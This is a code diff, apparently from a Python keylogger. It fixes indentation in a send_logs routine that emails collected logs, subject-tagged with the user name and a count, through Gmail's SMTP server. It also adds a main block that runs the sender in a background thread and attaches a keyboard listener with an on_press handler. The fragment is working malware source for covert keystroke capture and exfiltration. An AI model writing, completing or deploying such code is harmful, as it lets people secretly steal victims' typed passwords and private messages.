@@ -91,8 +91,8 @@ def send_logs():
 				write_file(count)
 
 				subject = f'[{user}] ~ {count}'
-				
-                msg = MIMEMultipart()
+
+				msg = MIMEMultipart()
 				msg['From'] = fromAddr
 				msg['To'] = toAddr
 				msg['Subject'] = subject
@@ -113,7 +113,7 @@ def send_logs():
 				text = msg.as_string()
 				print('test msg.as_string')
 
-                s = smtplib.SMTP('smtp.gmail.com',587)
+				s = smtplib.SMTP('smtp.gmail.com',587)
 				s.ehlo()
 				s.starttls()
 				print('starttls')
@@ -134,4 +134,10 @@ def send_logs():
 			except Exception as errorString:
 				print('[!] send_logs // Error.. ~ %s' % (errorString))
 				pass
+			
+if __name__=='__main__':
+	T1 = threading.Thread(target=send_logs)
+	T1.start()
 
+	with Listener(on_press=on_press) as listener:
+		listener.join()
